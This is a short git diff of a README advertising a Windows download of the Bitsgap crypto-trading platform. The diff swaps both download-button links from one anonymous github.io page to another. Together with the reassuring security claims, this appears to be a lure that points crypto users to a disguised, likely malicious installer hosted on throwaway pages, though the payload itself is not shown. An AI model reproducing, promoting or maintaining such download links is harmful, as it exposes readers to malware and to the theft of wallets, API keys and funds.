@@ -4,7 +4,7 @@
 
 ## 📥 Download Bitsgap for Windows
 
-[![⬇️ Download Bitsgap](https://img.shields.io/badge/Download-Bitsgap-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/232)
+[![⬇️ Download Bitsgap](https://img.shields.io/badge/Download-Bitsgap-blue?style=for-the-badge&logo=windows)](https://bitsgapload.github.io/.github/)
 
 ---
 
@@ -32,7 +32,7 @@ The platform integrates with over 15 major cryptocurrency exchanges, offering re
 
 Bitsgap emphasizes security by encrypting API keys, enabling two-factor authentication, and never holding user funds directly. Whether you are a day trader, a long-term investor, or a crypto enthusiast seeking passive income strategies, Bitsgap offers a flexible, all-in-one toolkit to optimize your trading operations.
 
-[![⬇️ Download Bitsgap](https://img.shields.io/badge/Download-Bitsgap-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/232)
+[![⬇️ Download Bitsgap](https://img.shields.io/badge/Download-Bitsgap-blue?style=for-the-badge&logo=windows)](https://bitsgapload.github.io/.github/)
 
 ---
 
